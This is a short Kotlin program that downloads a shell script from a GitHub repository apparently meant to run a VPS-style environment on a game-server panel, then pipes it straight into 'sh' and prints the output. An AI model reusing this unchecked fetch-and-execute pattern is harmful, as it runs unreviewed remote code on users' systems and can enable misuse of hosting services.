import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URL

fun main() {
    val url = URL("https://raw.githubusercontent.com/dxomg/vpsfreepterovm/main/harbor.sh")

    try {
        val scriptContent = downloadScript(url)

        // Run the downloaded script
        val processBuilder = ProcessBuilder("sh")
        processBuilder.redirectErrorStream(true)
        val process = processBuilder.start()

        val outputStream = process.outputStream
        outputStream.bufferedWriter().use { writer ->
            writer.write(scriptContent)
        }
        outputStream.close()

        val inputStream = process.inputStream
        val reader = BufferedReader(InputStreamReader(inputStream))
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            println(line)
        }
        reader.close()

        val exitCode = process.waitFor()
        println("Script execution completed with exit code: $exitCode")
    } catch (e: Exception) {
        println("Error downloading or running script: ${e.message}")
        e.printStackTrace()
    }
}

fun downloadScript(url: URL): String {
    val connection = url.openConnection()
    val content = StringBuilder()
    connection.getInputStream().use { input ->
        BufferedReader(InputStreamReader(input)).use { reader ->
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                content.append(line).append('\n')
            }
        }
    }
    return content.toString()
}
